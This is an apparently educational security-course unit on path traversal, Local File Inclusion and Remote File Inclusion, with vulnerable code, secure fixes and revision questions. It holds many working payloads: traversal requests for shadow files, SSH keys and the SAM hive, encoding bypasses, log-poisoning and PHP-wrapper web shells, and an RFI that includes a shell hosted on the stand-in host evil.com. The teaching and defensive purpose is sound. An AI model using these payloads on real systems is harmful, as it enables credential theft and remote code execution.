# Unit 10: Other Web Vulnerabilities - Topic 2: Path Traversal

## Overview

Path traversal (also known as directory traversal or dot-dot-slash attacks) is a vulnerability that allows attackers to access files and directories outside the intended web root directory. By manipulating file path references with sequences like `../`, attackers can read sensitive system files, application source code, configuration files, and in some cases achieve **Remote Code Execution (RCE)** through Local File Inclusion (LFI) or Remote File Inclusion (RFI).

---

## 1. Path Traversal Fundamentals

### How Path Traversal Works

```
Intended Behavior:
┌──────────┐    GET /view?file=report.pdf    ┌──────────┐    Read File    ┌─────────────────────┐
│  Client  │ ──────────────────────────────► │  Server  │ ─────────────► │ /var/www/files/      │
│          │                                 │          │                │   report.pdf ✓       │
└──────────┘                                 └──────────┘                └─────────────────────┘

Path Traversal Attack:
┌──────────┐  GET /view?file=../../../etc/passwd  ┌──────────┐   Read File    ┌──────────────────┐
│ Attacker │ ──────────────────────────────────► │  Server  │ ────────────► │ /etc/passwd ✗     │
│          │                                     │          │               │ (OUTSIDE webroot) │
└──────────┘                                     └──────────┘               └──────────────────┘

Path Resolution:
  /var/www/files/ + ../../../etc/passwd
  /var/www/files/../../../etc/passwd
  /var/www/../../../etc/passwd
  /var/../../etc/passwd
  /../../etc/passwd
  /etc/passwd  ← Final resolved path
```

### Vulnerable Code Examples

**PHP:**
```php
// Vulnerable - direct user input in file path
$file = $_GET['page'];
include("/var/www/pages/" . $file);
// Attack: ?page=../../../etc/passwd

// Another pattern
$template = $_GET['template'];
$content = file_get_contents("templates/" . $template);
```

**Python (Flask):**
```python
# Vulnerable
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/var/www/files/{filename}')
# Attack: /download?file=../../../etc/passwd
```

**Node.js:**
```javascript
// Vulnerable
app.get('/read', (req, res) => {
    const filePath = path.join(__dirname, 'public', req.query.file);
    res.sendFile(filePath);
});
// Attack: /read?file=../../../etc/passwd
```

**Java:**
```java
// Vulnerable
String file = request.getParameter("file");
FileInputStream fis = new FileInputStream("/var/www/docs/" + file);
```

---

## 2. Basic Path Traversal Attacks

### Linux Targets

```bash
# Basic traversal
GET /view?file=../../../etc/passwd
GET /view?file=../../../etc/shadow
GET /view?file=../../../etc/hosts

# Application configuration files
GET /view?file=../../../var/www/html/config.php
GET /view?file=../../../var/www/html/.env
GET /view?file=../../../opt/app/config/database.yml

# SSH keys
GET /view?file=../../../home/user/.ssh/id_rsa
GET /view?file=../../../root/.ssh/id_rsa
GET /view?file=../../../root/.ssh/authorized_keys

# Process information
GET /view?file=../../../proc/self/environ
GET /view?file=../../../proc/self/cmdline
GET /view?file=../../../proc/self/fd/0
```

### Windows Targets

```bash
# System files
GET /view?file=..\..\..\..\windows\system32\config\sam
GET /view?file=..\..\..\..\windows\system32\config\system
GET /view?file=..\..\..\..\windows\win.ini
GET /view?file=..\..\..\..\windows\system.ini
GET /view?file=..\..\..\..\boot.ini

# IIS configuration
GET /view?file=..\..\..\..\inetpub\wwwroot\web.config
GET /view?file=..\..\..\..\inetpub\logs\LogFiles\W3SVC1\

# User files
GET /view?file=..\..\..\..\Users\Administrator\Desktop\
```

### Interesting Files to Target

| OS | File Path | Contains |
|----|-----------|----------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes |
| Linux | `/etc/hosts` | Host mappings |
| Linux | `/proc/self/environ` | Environment variables |
| Linux | `/proc/self/cmdline` | Process command line |
| Linux | `/var/log/apache2/access.log` | Web server logs |
| Linux | `/home/user/.bash_history` | Command history |
| Linux | `/home/user/.ssh/id_rsa` | SSH private key |
| Linux | `/var/www/html/.env` | App environment config |
| Windows | `C:\boot.ini` | Boot configuration |
| Windows | `C:\windows\win.ini` | Windows config |
| Windows | `C:\windows\system32\config\sam` | User hashes |
| Windows | `C:\inetpub\wwwroot\web.config` | IIS config |
| Windows | `C:\windows\system32\drivers\etc\hosts` | Host mappings |

---

## 3. Encoding and Bypass Techniques

### 3.1 URL Encoding

```bash
# Standard URL encoding
../  →  %2e%2e%2f      (dot dot slash)
..\  →  %2e%2e%5c      (dot dot backslash)

# Single dot encoding
../  →  %2e%2e/
../  →  ..%2f
../  →  %2e./

# Examples
GET /view?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
GET /view?file=..%2f..%2f..%2fetc%2fpasswd
GET /view?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 3.2 Double URL Encoding

```bash
# Double encoding (server decodes twice)
../  →  %252e%252e%252f
.    →  %252e
/    →  %252f
\    →  %255c

# Example
GET /view?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 3.3 Unicode/UTF-8 Encoding

```bash
# Unicode representations
../  →  ..%c0%af        (overlong UTF-8)
../  →  ..%ef%bc%8f     (fullwidth slash)
.    →  %c0%2e          (overlong UTF-8 dot)
/    →  %c0%af          (overlong UTF-8 slash)
\    →  %c1%5c          (overlong UTF-8 backslash)

# IIS Unicode bypass (CVE-2000-0884)
GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir
GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir
```

### 3.4 Null Byte Injection (Legacy)

```bash
# Null byte truncation (PHP < 5.3.4, old Java)
GET /view?file=../../../etc/passwd%00.jpg
GET /view?file=../../../etc/passwd%00.png

# The application appends .jpg but null byte terminates the string
# Server reads: /etc/passwd[NULL].jpg → /etc/passwd
```

### 3.5 Filter Bypass Techniques

```bash
# If ../ is stripped (non-recursive)
....//....//....//etc/passwd
..../..../..../etc/passwd

# If ../ is stripped recursively
....\/....\/etc/passwd
..;/..;/..;/etc/passwd  (Tomcat/Java)

# Absolute path (bypass relative path check)
/etc/passwd
/var/www/html/config.php

# Using backslash on Windows
..\..\..\windows\win.ini
..\/..\/..\/etc/passwd  (mixed slashes)

# Dot segment normalization
/var/www/html/./../../../../etc/passwd
/var/www/html/pages/../../../../../etc/passwd
```

### Encoding Bypass Summary

| Technique | Payload | Bypass Target |
|-----------|---------|---------------|
| URL encode dots | `%2e%2e/` | Basic string matching |
| URL encode slash | `..%2f` | Slash filtering |
| Double encode | `%252e%252e%252f` | Single decode + filter |
| UTF-8 overlong | `..%c0%af` | ASCII-only filters |
| Null byte | `..%00` | Extension appending |
| Double dot | `....//` | Non-recursive stripping |
| Backslash | `..\` | Forward-slash-only filters |
| Dot segment | `./../../` | Simple pattern matching |
| Semicolon (Tomcat) | `..;/` | Path normalization |

---

## 4. Local File Inclusion (LFI)

LFI occurs when the application includes/executes a local file based on user input, potentially leading to **code execution**.

### Basic LFI

```php
// Vulnerable PHP code
<?php
  $page = $_GET['page'];
  include($page);  // or include_once, require, require_once
?>
```

### LFI to RCE Techniques

**1. Log Poisoning:**
```bash
# Step 1: Inject PHP code into Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log file
GET /view?page=../../../var/log/apache2/access.log&cmd=id

# Other log files to poison:
# /var/log/apache2/error.log
# /var/log/nginx/access.log
# /var/log/mail.log (via SMTP)
# /var/log/auth.log (via SSH)
# /proc/self/fd/1 (stdout)
```

**2. PHP Wrappers:**
```bash
# Read source code (base64 encoded)
GET /view?page=php://filter/convert.base64-encode/resource=config.php

# Execute code via data wrapper
GET /view?page=data://text/plain,<?php system('id'); ?>
GET /view?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Execute code via input wrapper (POST body)
POST /view?page=php://input
Content-Type: text/plain

<?php system('id'); ?>

# Expect wrapper (if expect extension enabled)
GET /view?page=expect://id

# Zip wrapper
GET /view?page=zip://path/to/file.zip%23shell.php
```

**3. /proc/self/environ:**
```bash
# Inject code via User-Agent, then include environ
curl -A "<?php system('id'); ?>" \
  "http://target.com/view?page=../../../proc/self/environ"
```

**4. PHP Session Files:**
```bash
# Step 1: Set session variable with PHP code
GET /login?user=<?php system('id'); ?>

# Step 2: Include the session file
GET /view?page=../../../tmp/sess_[SESSION_ID]
# Or: /var/lib/php/sessions/sess_[SESSION_ID]
```

### PHP Wrapper Reference

| Wrapper | Usage | Requires |
|---------|-------|----------|
| `php://filter` | Read source code | `allow_url_include=Off` OK |
| `php://input` | Execute POST body | `allow_url_include=On` |
| `data://` | Execute inline code | `allow_url_include=On` |
| `expect://` | Execute system commands | expect extension |
| `zip://` | Execute from ZIP file | ZIP uploaded |
| `phar://` | Execute from PHAR | PHAR uploaded |
| `file://` | Read local files | Default |

---

## 5. Remote File Inclusion (RFI)

RFI occurs when the application includes a remote file from an attacker-controlled server.

```php
// Vulnerable - allow_url_include must be On
<?php
  $page = $_GET['page'];
  include($page);
?>
```

### RFI Exploitation

```bash
# Step 1: Host malicious PHP on attacker server
# Attacker server (evil.com/shell.txt):
<?php system($_GET['cmd']); ?>

# Step 2: Include remote file
GET /view?page=http://evil.com/shell.txt&cmd=id
GET /view?page=http://evil.com/shell.txt%00  (null byte for extension bypass)

# Using SMB (Windows targets)
GET /view?page=\\evil.com\share\shell.php

# Using data URI
GET /view?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

## 6. Automated Tools

### dotdotpwn
```bash
# Comprehensive path traversal fuzzer
dotdotpwn -m http -h target.com -M GET \
  -u "http://target.com/view?file=TRAVERSAL" \
  -f /etc/passwd -k "root:" -b

# Options:
# -m http     Protocol module
# -M GET      HTTP method
# -u          URL with TRAVERSAL placeholder
# -f          Target file to retrieve
# -k          Keyword to identify success
# -b          Break on first match
```

### Burp Suite Intruder
```
1. Capture request with file parameter
2. Send to Intruder
3. Mark the path value as payload position
4. Load path traversal wordlist
5. Filter responses by size or content keywords
```

### ffuf for Path Traversal
```bash
# Fuzz for traversal with wordlist
ffuf -u "http://target.com/view?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 -mc 200

# Custom traversal depth
for i in $(seq 1 10); do
    TRAV=$(python3 -c "print('../'*$i + 'etc/passwd')")
    curl -s "http://target.com/view?file=$TRAV" | grep -q "root:" && \
      echo "SUCCESS at depth $i: $TRAV" && break
done
```

### Useful Wordlists
```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/usr/share/wordlists/dotdotpwn/traversal.txt
```

---

## 7. Prevention Techniques

### Secure Coding Practices

**Python (Flask) - Secure Implementation:**
```python
import os
from flask import Flask, request, abort, send_from_directory
from werkzeug.utils import secure_filename

UPLOAD_DIR = '/var/www/files'

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    
    # 1. Sanitize filename
    filename = secure_filename(filename)
    
    # 2. Construct full path
    filepath = os.path.join(UPLOAD_DIR, filename)
    
    # 3. Resolve to absolute path and verify it's within allowed directory
    filepath = os.path.realpath(filepath)
    if not filepath.startswith(os.path.realpath(UPLOAD_DIR)):
        abort(403)
    
    # 4. Check file exists
    if not os.path.isfile(filepath):
        abort(404)
    
    return send_from_directory(UPLOAD_DIR, filename)
```

**PHP - Secure Implementation:**
```php
<?php
$base_dir = realpath('/var/www/pages/');
$requested = $_GET['page'] ?? 'home';

// Whitelist approach (BEST)
$allowed_pages = ['home', 'about', 'contact', 'faq'];
if (!in_array($requested, $allowed_pages)) {
    die('Invalid page');
}
include($base_dir . '/' . $requested . '.php');

// Alternative: Path validation
$full_path = realpath($base_dir . '/' . $requested);
if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
    die('Access denied');
}
include($full_path);
?>
```

**Java - Secure Implementation:**
```java
import java.nio.file.Path;
import java.nio.file.Paths;

public File getFile(String userInput) {
    Path basePath = Paths.get("/var/www/files").toRealPath();
    Path resolvedPath = basePath.resolve(userInput).normalize().toRealPath();
    
    // Verify resolved path is within base directory
    if (!resolvedPath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }
    
    return resolvedPath.toFile();
}
```

### Prevention Checklist

| Control | Description |
|---------|-------------|
| **Input validation** | Whitelist allowed filenames/characters |
| **Path canonicalization** | Use `realpath()` to resolve and validate |
| **Chroot/jail** | Restrict filesystem access to specific directory |
| **Least privilege** | Run application with minimal file permissions |
| **Disable includes** | Set `allow_url_include=Off` in PHP |
| **WAF rules** | Block `../`, `..\\`, encoded variants |
| **ID-based references** | Map files to IDs instead of using filenames |
| **Sandboxing** | Use containers with limited filesystem access |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Basic Traversal** | Use `../` sequences to escape web root directory |
| **URL Encoding** | `%2e%2e%2f`, double encoding `%252e%252e%252f` |
| **Null Byte** | `%00` truncates file extension (legacy systems) |
| **LFI** | Include local files for code execution via log poisoning, PHP wrappers |
| **RFI** | Include remote files (requires `allow_url_include=On`) |
| **PHP Wrappers** | `php://filter`, `php://input`, `data://`, `expect://` |
| **Log Poisoning** | Inject code into logs, then include log file |
| **Prevention** | Whitelist, path canonicalization, chroot, disable includes |

---

## Revision Questions

1. Explain the difference between path traversal and Local File Inclusion (LFI). How can LFI lead to Remote Code Execution?
2. Describe three different encoding techniques to bypass path traversal filters and explain why each works.
3. What are PHP wrappers and how can `php://filter` be used to read source code without executing it?
4. Explain log poisoning as an LFI-to-RCE technique. What steps are involved?
5. How does `realpath()` help prevent path traversal attacks? What is the importance of path canonicalization?
6. Compare the security implications of Local File Inclusion vs Remote File Inclusion.

---

*Previous: [01-file-upload-vulnerabilities.md](01-file-upload-vulnerabilities.md) | Next: [03-ssrf.md](03-ssrf.md)*

---

*[Back to README](../README.md)*
